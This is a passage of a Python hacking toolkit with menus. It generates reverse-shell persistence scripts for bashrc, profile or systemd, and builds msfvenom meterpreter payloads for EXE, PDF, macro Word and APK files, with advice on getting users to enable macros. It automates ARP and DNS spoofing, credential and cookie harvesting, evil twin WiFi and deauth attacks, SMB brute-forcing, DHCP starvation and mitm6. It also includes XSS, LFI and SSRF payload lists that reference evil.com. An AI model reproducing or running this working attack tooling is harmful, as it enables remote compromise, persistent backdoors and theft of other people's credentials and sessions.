        print("[-] Invalid port number.")
        return
    print("Select persistence method:")
    print("1. Add to ~/.bashrc (default)")
    print("2. Add to ~/.profile")
    print("3. Create systemd service (root)")
    method = input("Method [1-3]: ").strip() or "1"
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    if method == "2":
        script = f'echo "{payload}" >> ~/.profile'
    elif method == "3":
        script = f'''echo -e '[Unit]\nDescription=Reverse Shell\n[Service]\nType=simple\nExecStart=/bin/bash -c \"{payload}\"\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/revshell.service > /dev/null
sudo systemctl daemon-reload
sudo systemctl enable revshell.service
sudo systemctl start revshell.service'''
    else:
        script = f'echo "{payload}" >> ~/.bashrc'
    print("\n[+] Run this on the target for persistence:")
    print(script)
    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
    if save:
        fname = input("Filename (default: persistence.sh): ").strip() or "persistence.sh"
        with open(fname, "w") as f:
            f.write(script + "\n")
        print(f"[+] Script saved as {fname}")

def start_listener():
    print("[!] Start a Netcat (nc) listener to catch reverse shells.")
    port = input("Port to listen on: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print(f"[+] To listen for a reverse shell, run this command in your terminal:")
    print(f"nc -lvnp {port}")
    # Optionally, try to launch nc automatically if available
    if shutil.which("nc"):
        auto = input("Launch listener now? (y/N): ").strip().lower() == 'y'
        if auto:
            print(f"[+] Starting listener on port {port} (press Ctrl+C to stop)...")
            try:
                subprocess.run(["nc", "-lvnp", str(port)])
            except KeyboardInterrupt:
                print("[!] Listener stopped.")

def generate_msfvenom_payload():
    print("[!] Automated msfvenom payload generator (requires Metasploit installed)")
    print("Select payload type:")
    print("1. Windows EXE (.exe)")
    print("2. PDF (.pdf, requires vulnerable reader)")
    print("3. Word DOCX (.docx, macro, requires user to enable macros)")
    print("4. Android APK (.apk)")
    ptype = input("Payload type [1-4]: ").strip()
    lhost = input("LHOST (your IP): ").strip()
    lport = input("LPORT (your port): ").strip()
    output = input("Output filename (e.g. shell.exe): ").strip()
    if not lhost or not lport or not output:
        print("[-] LHOST, LPORT, and output filename are required.")
        return
    if ptype == "1":
        payload = "windows/shell_reverse_tcp"
        fmt = "exe"
    elif ptype == "2":
        payload = "windows/meterpreter/reverse_tcp"
        fmt = "pdf"
    elif ptype == "3":
        payload = "windows/meterpreter/reverse_tcp"
        fmt = "raw"
    elif ptype == "4":
        payload = "android/meterpreter/reverse_tcp"
        fmt = "apk"
    else:
        print("[-] Invalid payload type.")
        return
    print(f"[+] Generating payload with msfvenom...")
    if ptype == "3":
        macro_file = output if output.endswith(".txt") else output + ".txt"
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", macro_file]
        print(f"[!] For DOCX, you must embed the macro from {macro_file} into a Word document manually.")
    else:
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output]
    spinner = Spinner("Generating payload")
    spinner.start()
    try:
        subprocess.run(cmd, check=True)
    except Exception as e:
        spinner.stop()
        print(f"[-] msfvenom failed: {e}")
        return
    spinner.stop()
    print(f"[+] Payload generated: {output if ptype != '3' else macro_file}")
    if ptype == "2":
        print("[!] PDF payloads require a vulnerable PDF reader to be effective.")
    if ptype == "3":
        print("[!] Embed the macro into a Word document and instruct the user to enable macros.")
    if ptype == "4":
        print("[!] APK payloads require installation and permissions on the target device.")
        print("[!] To catch the session, use Metasploit multi/handler:")
        print("    msfconsole")
        print("    use exploit/multi/handler")
        print("    set payload android/meterpreter/reverse_tcp")
        print(f"    set LHOST {lhost}")
        print(f"    set LPORT {lport}")
        print("    run")

def bettercap_menu():
    menu_text = """
[Bettercap MITM]
1. Start Bettercap CLI (WiFi/Ethernet)
2. Start Bettercap Web UI (remote control)
3. Show Bettercap credential log
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[Bettercap] Select Option > ").strip()
        if choice == "1":
            ensure_installed("bettercap", "bettercap")
            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
            channel = input("WiFi Channel (optional, press Enter to skip): ").strip()
            caplet = input("Bettercap caplet (e.g. wifi-ap, wifi-recon, press Enter for default): ").strip()
            print("[!] To harvest credentials, use caplets like 'wifi-ap', 'http-req-dump', or 'net.sniff'.")
            cmd = ["sudo", "bettercap", "-iface", iface]
            if channel:
                cmd += ["-eval", f"wifi.channel {channel}"]
            if caplet:
                cmd += ["-caplet", caplet]
            print(f"[+] Running: {' '.join(cmd)}")
            try:
                subprocess.run(cmd)
            except Exception as e:
                print(f"[-] Bettercap failed: {e}")
        elif choice == "2":
            ensure_installed("bettercap", "bettercap")
            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
            print("[+] Launching Bettercap Web UI on http://127.0.0.1:8083 (default password: bettercap)")
            print("[!] In your browser, go to http://127.0.0.1:8083 and login.")
            print("[!] For remote access, forward port 8083 or use SSH tunneling.")
            try:
                subprocess.run(["sudo", "bettercap", "-iface", iface, "-caplet", "http-ui"])
            except Exception as e:
                print(f"[-] Bettercap Web UI failed: {e}")
        elif choice == "3":
            log_path = os.path.expanduser("~/.bettercap/logs/creds.log")
            if os.path.exists(log_path):
                print(f"[+] Showing credentials from {log_path}:")
                with open(log_path) as f:
                    print(f.read())
            else:
                print("[-] No Bettercap credential log found.")
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def mitm_menu():
    menu_text = """
[Advanced MITM Attacks]
1. ARP Spoofing (arpspoof)
2. HTTP/HTTPS Sniffing & Credential Harvesting (mitmproxy)
3. DNS Spoofing (dnsspoof)
4. Ettercap (CLI)
5. Bettercap (Full MITM)
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[MITM] Select Option > ").strip()
        if choice == "1":
            ensure_installed("arpspoof", "dsniff")
            arp_spoof()
        elif choice == "2":
            ensure_installed("mitmproxy", "mitmproxy")
            http_sniff_and_harvest()
        elif choice == "3":
            ensure_installed("dnsspoof", "dsniff")
            dns_spoof()
        elif choice == "4":
            ensure_installed("ettercap", "ettercap-text-only")
            print("[+] Launching Ettercap CLI. For GUI, run 'sudo ettercap -G' in a separate terminal.")
            try:
                subprocess.run(["sudo", "ettercap", "-T", "-q", "-i", input("Interface (e.g. eth0): ").strip()])
            except Exception as e:
                print(f"[-] Ettercap failed: {e}")
        elif choice == "5":
            bettercap_menu()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def log_mitm_result(data):
    with open("results_mitm.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")

def http_sniff_and_harvest():
    ensure_installed("mitmproxy", "mitmproxy")
    iface = input("Network interface (e.g. eth0): ").strip()
    port = input("Proxy port (default 8080): ").strip() or "8080"
    print("[!] You may need to set up iptables to redirect traffic to the proxy port.")
    print("[!] mitmproxy will log HTTP POST data and cookies for credential/session harvesting.")
    print(f"[+] Starting mitmproxy on {iface}:{port} (press q to quit)...")
    print("[!] After stopping mitmproxy, credentials and session tokens will be parsed and saved to results_mitm.txt.")
    flows_file = "mitmproxy_flows.log"
    try:
        subprocess.run(["mitmproxy", "-i", iface, "-p", port, "-w", flows_file])
    except Exception as e:
        print(f"[-] mitmproxy failed: {e}")
        return
    # Try to parse mitmproxy flows for credentials and session tokens
    try:
        try:
            import mitmproxy.io
            from mitmproxy import http
        except ImportError:
            print("[-] mitmproxy Python module not installed. Skipping parsing. You can install it with: pip install mitmproxy")
            return
        found = []
        with open(flows_file, "rb") as logfile:
            freader = mitmproxy.io.FlowReader(logfile)
            for flow in freader.stream():
                if isinstance(flow, http.HTTPFlow):
                    # Credential harvesting: look for POST data
                    if flow.request.method == "POST":
                        post_data = flow.request.get_text()
                        if any(k in post_data.lower() for k in ["pass", "user", "login", "pwd", "email"]):
                            entry = f"[CRED] {flow.request.host}{flow.request.path} | {post_data}"
                            print(entry)
                            log_mitm_result(entry)
                            found.append(entry)
                    # Session hijacking: look for cookies
                    cookies = flow.request.cookies.fields
                    if cookies:
                        entry = f"[COOKIE] {flow.request.host}{flow.request.path} | {cookies}"
                        print(entry)
                        log_mitm_result(entry)
                        found.append(entry)
        if not found:
            print("[!] No credentials or session tokens found in flows.")
        else:
            print(f"[+] {len(found)} credentials/session tokens harvested. See results_mitm.txt.")
    except Exception as e:
        print(f"[-] Error parsing mitmproxy flows: {e}")

def arp_spoof():
    ensure_installed("arpspoof", "dsniff")
    iface = input("Network interface (e.g. eth0): ").strip()
    target = input("Target IP (victim): ").strip()
    gateway = input("Gateway IP (router): ").strip()
    print("[!] You may need to enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1")
    print(f"[+] Running: sudo arpspoof -i {iface} -t {target} {gateway}")
    try:
        subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", target, gateway])
    except Exception as e:
        print(f"[-] arpspoof failed: {e}")

def dns_spoof():
    ensure_installed("dnsspoof", "dsniff")
    iface = input("Network interface (e.g. eth0): ").strip()
    hosts_file = input("Hosts file (e.g. /tmp/dnshosts): ").strip()
    print(f"[+] Running: sudo dnsspoof -i {iface} -f {hosts_file}")
    try:
        subprocess.run(["sudo", "dnsspoof", "-i", iface, "-f", hosts_file])
    except Exception as e:
        print(f"[-] dnsspoof failed: {e}")

def wifi_mitm_menu():
    menu_text = """
[WiFi MITM Attacks]
1. Evil Twin AP (airbase-ng)
2. Deauth + Rogue AP (airbase-ng + deauth)
3. Automated Phishing Portal (wifiphisher)
4. Ettercap (GUI)
5. Bettercap (Full WiFi MITM)
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[WiFi MITM] Select Option > ").strip()
        if choice == "1":
            ensure_installed("airbase-ng", "aircrack-ng")
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            evil_twin_ap()
        elif choice == "2":
            ensure_installed("airbase-ng", "aircrack-ng")
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            deauth_rogue_ap()
        elif choice == "3":
            if shutil.which("wifiphisher") is None:
                print("[-] wifiphisher not found. Install with: sudo apt install wifiphisher")
                continue
            if not check_root():
                continue
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            print("[!] Troubleshooting: If wifiphisher fails, ensure your interface supports monitor mode and is not blocked by rfkill.")
            try:
                subprocess.run(["sudo", "wifiphisher", "-i", iface])
            except Exception as e:
                print(f"[-] wifiphisher failed: {e}")
        elif choice == "4":
            ensure_installed("ettercap", "ettercap-graphical")
            print("[+] Launching Ettercap GUI...")
            try:
                subprocess.run(["sudo", "ettercap", "-G"])
            except Exception as e:
                print(f"[-] Ettercap GUI failed: {e}")
        elif choice == "5":
            bettercap_menu()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def log_wifi_mitm_result(data):
    with open("results_wifi_mitm.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")

def evil_twin_ap():
    ensure_installed("airbase-ng", "aircrack-ng")
    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
    ssid = input("SSID to clone (target network name): ").strip()
    channel = input("Channel (default 6): ").strip() or "6"
    print("[!] This will create a fake AP with the same SSID. Clients may connect if deauthed from the real AP.")
    print(f"[+] Running: sudo airbase-ng -e '{ssid}' -c {channel} {iface}")
    log_wifi_mitm_result(f"Evil Twin AP started: SSID={ssid}, channel={channel}, iface={iface}")
    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
    try:
        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
    except Exception as e:
        print(f"[-] airbase-ng failed: {e}")

def deauth_rogue_ap():
    ensure_installed("airbase-ng", "aircrack-ng")
    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
    ssid = input("SSID to clone (target network name): ").strip()
    channel = input("Channel (default 6): ").strip() or "6"
    bssid = input("Target BSSID (AP MAC): ").strip()
    client = input("Target client MAC (leave blank for broadcast): ").strip()
    print("[!] First, deauth clients from the real AP...")
    if client:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, iface])
    else:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, iface])
    print("[+] Now starting Evil Twin AP...")
    log_wifi_mitm_result(f"Deauth+Rogue AP: SSID={ssid}, channel={channel}, iface={iface}, bssid={bssid}, client={client if client else 'broadcast'}")
    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
    try:
        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
    except Exception as e:
        print(f"[-] airbase-ng failed: {e}")

def wifiphisher_attack():
    ensure_installed("wifiphisher", "wifiphisher")
    print("[!] Wifiphisher automates WiFi MITM, phishing, and captive portal attacks.")
    print("[+] Launching Wifiphisher (requires root, monitor mode)...")
    log_wifi_mitm_result("Wifiphisher attack started.")
    print("[!] Wifiphisher saves captured credentials and phishing results in its output directory (shown in the tool).")
    try:
        subprocess.run(["sudo", "wifiphisher"])
    except Exception as e:
        print(f"[-] wifiphisher failed: {e}")

def osint_menu():
    menu_text = """
[OSINT Toolkit]
1. Username/Email Enumeration (Sherlock)
2. Social Media Profile Search
3. Domain/Company OSINT
4. Pastebin/Leak Search
5. OSINT Wordlist Generator
6. Generate OSINT Report
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[OSINT] Select Option > ").strip()
        if choice == "1":
            sherlock_enum()
        elif choice == "2":
            social_media_search()
        elif choice == "3":
            domain_osint()
        elif choice == "4":
            pastebin_leak_search()
        elif choice == "5":
            osint_wordlist_generator()
        elif choice == "6":
            osint_report()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def sherlock_enum():
    print("[!] Username/Email Enumeration using Sherlock (if installed)")
    username = input("Username or email to search: ").strip()
    if not username:
        print("[-] No username/email provided.")
        return
    if shutil.which("sherlock"):
        print(f"[+] Running Sherlock for {username}...")
        subprocess.run(["sherlock", username])
    else:
        print("[-] Sherlock not found. Install with: pip install sherlock or git clone https://github.com/sherlock-project/sherlock")

def social_media_search():
    username = input("Username to search on social media: ").strip()
    if not username:
        print("[-] No username provided.")
        return
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
    }
    print(f"[+] Social media profile URLs for '{username}':")
    for platform, url in platforms.items():
        print(f"  {platform}: {url}")
    print("[!] Open these links in your browser to check for existence and public info.")

def domain_osint():
    domain = input("Domain or company: ").strip()
    if not domain:
        print("[-] No domain provided.")
        return
    print(f"[+] WHOIS for {domain}:")
    whois_lookup(domain)
    print(f"[+] DNS records for {domain}:")
    dns_lookup(domain)
    print(f"[+] Subdomain scan for {domain}:")
    find_subdomains(domain)
    # Company info lookup (Clearbit API, if available)
    try:
        import requests
        clearbit_url = f"https://company.clearbit.com/v2/companies/find?domain={domain}"
        headers = {"Authorization": "Bearer CLEARBIT_API_KEY"}  # User must set their API key
        r = requests.get(clearbit_url, headers=headers)
        if r.status_code == 200:
            print(f"[+] Clearbit company info for {domain}:")
            print(r.json())
        else:
            print("[!] Clearbit info not available or API key not set.")
    except Exception:
        print("[!] Clearbit lookup skipped (requests or API key missing).")
    # HaveIBeenPwned API (better formatting)
    email = input("Check an email for breaches (optional): ").strip()
    if email:
        try:
            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
            if r.status_code == 200 and 'No breached account' not in r.text:
                print(f"[!] Breach found for {email}!")
                print(r.text)
            else:
                print(f"[+] No breach found for {email}.")
        except Exception as e:
            print(f"[-] Error checking haveibeenpwned: {e}")

def pastebin_leak_search():
    query = input("Keyword/email/username/domain to search in public pastes: ").strip()
    if not query:
        print("[-] No query provided.")
        return
    print(f"[+] Searching public paste sites for '{query}' (basic web search)...")
    try:
        url = f"https://www.google.com/search?q=site:pastebin.com+{query}"
        print(f"[!] Open this in your browser: {url}")
    except Exception as e:
        print(f"[-] Error: {e}")

def osint_report():
    print("[+] Generating OSINT report...")
    report = []
    # Example: collect last search results (could be improved with persistent logging)
    report.append("OSINT Report - Summary\n====================\n")
    report.append("(Add your findings here as you use the toolkit!)\n")
    fname = input("Save report as (default osint_report.txt): ").strip() or "osint_report.txt"
    with open(fname, "w") as f:
        f.write("\n".join(report))
    print(f"[+] OSINT report saved as {fname}")

def advanced_xss_test():
    print("""
[Advanced XSS Testing]
- This module will test a target URL for reflected/stored XSS vulnerabilities.
- You can use automated tools (XSStrike, commix) if installed, or run basic payload tests.
""")
    url = input("Target URL (e.g. http://site.com/page?param=val): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    # Try XSStrike first
    if shutil.which("xsstrike"):
        print("[+] Running XSStrike...")
        try:
            subprocess.run(["xsstrike", "-u", url])
            log_result("xss", f"XSStrike scan: {url}")
            return
        except Exception as e:
            print(f"[-] XSStrike failed: {e}")
    # Try commix if available
    if shutil.which("commix"):
        print("[+] Running commix (for XSS and command injection)...")
        try:
            subprocess.run(["commix", "--url", url])
            log_result("xss", f"commix scan: {url}")
            return
        except Exception as e:
            print(f"[-] commix failed: {e}")
    # Fallback: simple reflected XSS test
    print("[!] Neither XSStrike nor commix found. Running basic reflected XSS test.")
    import requests
    payloads = [
        "<script>alert(1)</script>",
        "\"'><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if payload in r.text:
                print(f"[VULN] Payload reflected: {payload}")
                log_result("xss", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No reflected XSS found with basic payloads.")

def advanced_lfi_rfi_test():
    print("""
[Advanced LFI/RFI Testing]
- This module will test a target URL/parameter for Local/Remote File Inclusion vulnerabilities.
- If LFISuite is installed, it will be used. Otherwise, basic payloads will be tested.
""")
    url = input("Target URL (e.g. http://site.com/page.php?file=home): ").strip()
    if not url or '=' not in url:
        print("[-] Please provide a URL with a parameter (e.g. ...?file=home)")
        return
    # Try LFISuite if available
    if shutil.which("lfi-suite"):
        print("[+] Running LFISuite...")
        try:
            subprocess.run(["lfi-suite", "-u", url])
            log_result("lfi", f"LFISuite scan: {url}")
            return
        except Exception as e:
            print(f"[-] LFISuite failed: {e}")
    # Fallback: basic LFI payloads
    print("[!] LFISuite not found. Running basic LFI/RFI payload tests.")
    import requests
    payloads = [
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "http://evil.com/shell.txt"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if "root:x:" in r.text or "cGFzc3dk" in r.text or "hacked" in r.text:
                print(f"[VULN] LFI/RFI payload worked: {payload}")
                log_result("lfi", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No LFI/RFI found with basic payloads.")

def advanced_csrf_test():
    print("""
[Advanced CSRF Testing]
- This module will test a target URL for CSRF vulnerabilities.
- It checks for missing/weak CSRF tokens and can use OWASP ZAP or XSStrike if installed.
""")
    url = input("Target URL (e.g. http://site.com/form): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    # Try OWASP ZAP if available
    if shutil.which("zap.sh"):
        print("[+] Launching OWASP ZAP for automated CSRF scan...")
        try:
            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_csrf_report.html", "-quickprogress"])
            print("[+] ZAP scan complete. See zap_csrf_report.html for details.")
            log_result("csrf", f"ZAP scan: {url}")
            return
        except Exception as e:
            print(f"[-] ZAP failed: {e}")
    # Try XSStrike if available
    if shutil.which("xsstrike"):
        print("[+] Running XSStrike for CSRF checks...")
        try:
            subprocess.run(["xsstrike", "-u", url, "--fuzzer", "csrf"])
            log_result("csrf", f"XSStrike CSRF scan: {url}")
            return
        except Exception as e:
            print(f"[-] XSStrike failed: {e}")
    # Fallback: basic CSRF token check
    print("[!] Neither ZAP nor XSStrike found. Running basic CSRF token check.")
    import requests
    try:
        r = requests.get(url, timeout=10)
        if any(token in r.text.lower() for token in ["csrf", "xsrf", "token"]):
            print("[+] CSRF token found in form. (Check for proper implementation)")
            log_result("csrf", f"{url} - token found")
        else:
            print("[VULN] No CSRF token found in form!")
            log_result("csrf", f"{url} - no token found")
    except Exception as e:
        print(f"[-] Error fetching form: {e}")

def advanced_web_vuln_scan():
    print("""
[Advanced Web Vulnerability Scanner]
- This module will scan a target web application for common vulnerabilities.
- Nikto and OWASP ZAP will be used if available.
""")
    url = input("Target URL (e.g. http://site.com): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    ran = False
    # Try Nikto
    if shutil.which("nikto"):
        print("[+] Running Nikto web scanner...")
        try:
            subprocess.run(["nikto", "-h", url])
            log_result("webscan", f"Nikto scan: {url}")
            ran = True
        except Exception as e:
            print(f"[-] Nikto failed: {e}")
    # Try OWASP ZAP
    if shutil.which("zap.sh"):
        print("[+] Launching OWASP ZAP for automated scan...")
        try:
            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_webscan_report.html", "-quickprogress"])
            print("[+] ZAP scan complete. See zap_webscan_report.html for details.")
            log_result("webscan", f"ZAP scan: {url}")
            ran = True
        except Exception as e:
            print(f"[-] ZAP failed: {e}")
    if not ran:
        print("[!] Neither Nikto nor ZAP found. Please install at least one for automated web scanning.")
        print("[!] Nikto: sudo apt install nikto | ZAP: https://www.zaproxy.org/download/")

def advanced_ssrf_test():
    print("""
[Advanced SSRF Testing]
- This module will test a target URL/parameter for Server-Side Request Forgery vulnerabilities.
- If SSRFmap is installed, it will be used. Otherwise, basic payloads will be tested.
""")
    url = input("Target URL (e.g. http://site.com/page?url=...): ").strip()
    if not url or '=' not in url:
        print("[-] Please provide a URL with a parameter (e.g. ...?url=...)")
        return
    # Try SSRFmap if available
    if shutil.which("ssrfmap"):
        print("[+] Running SSRFmap...")
        try:
            subprocess.run(["ssrfmap", "-u", url])
            log_result("ssrf", f"SSRFmap scan: {url}")
            return
        except Exception as e:
            print(f"[-] SSRFmap failed: {e}")
    # Fallback: basic SSRF payloads
    print("[!] SSRFmap not found. Running basic SSRF payload tests.")
    import requests
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://evil.com/ssrf"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if any(x in r.text for x in ["root:x:", "meta-data", "ssrf"]):
                print(f"[VULN] SSRF payload worked: {payload}")
                log_result("ssrf", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No SSRF found with basic payloads.")

def advanced_smb_bruteforce():
    print("""
[Advanced SMB/NTLM/LDAP Brute-force]
- This module will brute-force SMB/NTLM/LDAP logins on a target.
- CrackMapExec or Medusa will be used if available.
""")
    target = input("Target IP/hostname: ").strip()
    username = input("Username (or path to userlist): ").strip()
    wordlist = input("Password wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not target or not username or not wordlist:
        print("[-] Please provide all required fields.")
        return
    ran = False
    # Try CrackMapExec
    if shutil.which("crackmapexec"):
        print("[+] Running CrackMapExec (SMB)...")
        try:
            subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", wordlist])
            log_result("smb_brute", f"CME SMB: {target} {username} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] CrackMapExec failed: {e}")
    # Try Medusa
    if shutil.which("medusa"):
        print("[+] Running Medusa (SMB)...")
        try:
            subprocess.run(["medusa", "-h", target, "-u", username, "-P", wordlist, "-M", "smbnt"])
            log_result("smb_brute", f"Medusa SMB: {target} {username} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] Medusa failed: {e}")
    if not ran:
        print("[!] Neither CrackMapExec nor Medusa found. Please install at least one for SMB brute-force.")
        print("[!] CrackMapExec: pip install crackmapexec | Medusa: sudo apt install medusa")

def advanced_hashdump_crack():
    print("""
[Advanced Hashdump & Offline Password Cracking]
- This module will attempt to crack password hashes using John the Ripper or Hashcat.
- You must provide a file containing hashes (e.g. /etc/shadow, NTLM, etc.).
""")
    hashfile = input("Path to hash file: ").strip()
    if not hashfile or not os.path.exists(hashfile):
        print("[-] Hash file not found.")
        return
    wordlist = input("Wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    ran = False
    # Try John the Ripper
    if shutil.which("john"):
        print("[+] Running John the Ripper...")
        try:
            subprocess.run(["john", "--wordlist", wordlist, hashfile])
            subprocess.run(["john", "--show", hashfile])
            log_result("hashcrack", f"John: {hashfile} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] John failed: {e}")
    # Try Hashcat
    if shutil.which("hashcat"):
        print("[+] Running Hashcat...")
        hashmode = input("Hashcat mode (e.g. 0 for MD5, 1000 for NTLM, 1800 for sha512crypt, see --help): ").strip()
        if not hashmode:
            print("[-] No hash mode provided for Hashcat.")
        else:
            try:
                subprocess.run(["hashcat", "-m", hashmode, hashfile, wordlist, "--force"])
                log_result("hashcrack", f"Hashcat: {hashfile} {wordlist} mode {hashmode}")
                ran = True
            except Exception as e:
                print(f"[-] Hashcat failed: {e}")
    if not ran:
        print("[!] Neither John the Ripper nor Hashcat found. Please install at least one for hash cracking.")
        print("[!] John: sudo apt install john | Hashcat: sudo apt install hashcat")

def advanced_dhcp_attack():
    print("""
[Advanced DHCP Starvation/Poisoning]
- This module will perform DHCP starvation or poisoning attacks on the local network.
- Yersinia or dhcpstarv will be used if available.
""")
    print("1. DHCP Starvation (exhaust IP pool)")
    print("2. DHCP Poisoning (rogue server)")
    print("0. Cancel")
    choice = input("Select attack type: ").strip()
    if choice == "0":
        return
    ran = False
    if choice == "1":
        # Try dhcpstarv
        if shutil.which("dhcpstarv"):
            print("[+] Running dhcpstarv for DHCP starvation...")
            try:
                subprocess.run(["dhcpstarv"])
                log_result("dhcp", "dhcpstarv starvation attack")
                ran = True
            except Exception as e:
                print(f"[-] dhcpstarv failed: {e}")
        # Try Yersinia
        elif shutil.which("yersinia"):
            print("[+] Running Yersinia (GUI, select DHCP module)...")
            try:
                subprocess.run(["yersinia", "-G"])
                log_result("dhcp", "Yersinia starvation attack")
                ran = True
            except Exception as e:
                print(f"[-] Yersinia failed: {e}")
    elif choice == "2":
        # Try Yersinia
        if shutil.which("yersinia"):
            print("[+] Running Yersinia (GUI, select DHCP module for poisoning)...")
            try:
                subprocess.run(["yersinia", "-G"])
                log_result("dhcp", "Yersinia poisoning attack")
                ran = True
            except Exception as e:
                print(f"[-] Yersinia failed: {e}")
        else:
            print("[-] No supported tool found for DHCP poisoning. Install Yersinia.")
    else:
        print("Invalid choice.")
    if not ran:
        print("[!] Neither Yersinia nor dhcpstarv found. Please install at least one for DHCP attacks.")
        print("[!] Yersinia: sudo apt install yersinia | dhcpstarv: https://github.com/kleo/dhcpstarv")

def advanced_snmp_enum():
    print("""
[Advanced SNMP Enumeration]
- This module will enumerate SNMP information from a target device.
- snmpwalk and onesixtyone will be used if available.
""")
    target = input("Target IP/hostname: ").strip()
    community = input("Community string (default 'public'): ").strip() or "public"
    if not target:
        print("[-] No target provided.")
        return
    ran = False
    # Try snmpwalk
    if shutil.which("snmpwalk"):
        print(f"[+] Running snmpwalk on {target} with community '{community}'...")
        try:
            subprocess.run(["snmpwalk", "-v2c", "-c", community, target])
            log_result("snmp_enum", f"snmpwalk: {target} {community}")
            ran = True
        except Exception as e:
            print(f"[-] snmpwalk failed: {e}")
    # Try onesixtyone
    if shutil.which("onesixtyone"):
        print(f"[+] Running onesixtyone on {target} with community '{community}'...")
        try:
            subprocess.run(["onesixtyone", "-c", community, target])
            log_result("snmp_enum", f"onesixtyone: {target} {community}")
            ran = True
        except Exception as e:
            print(f"[-] onesixtyone failed: {e}")
    if not ran:
        print("[!] Neither snmpwalk nor onesixtyone found. Please install at least one for SNMP enumeration.")
        print("[!] snmpwalk: sudo apt install snmp | onesixtyone: sudo apt install onesixtyone")

def advanced_ipv6_attacks():
    print("""
[Advanced IPv6 Attacks]
- This module will perform common IPv6 network attacks (RA spoofing, MITM6, etc.).
- mitm6 and THC-IPv6 tools will be used if available.
""")
    print("1. MITM6 (Windows IPv6 takeover)")
    print("2. THC-IPv6 Toolkit (choose attack)")
    print("0. Cancel")
    choice = input("Select attack type: ").strip()
    if choice == "0":
        return
    ran = False
    if choice == "1":
        if shutil.which("mitm6"):
            print("[+] Running mitm6 (requires root)...")
            try:
                subprocess.run(["sudo", "mitm6"])
                log_result("ipv6", "mitm6 attack")
                ran = True
            except Exception as e:
                print(f"[-] mitm6 failed: {e}")
        else:
            print("[-] mitm6 not found. Install with: pip install mitm6")
    elif choice == "2":
        if shutil.which("fake_router6"):
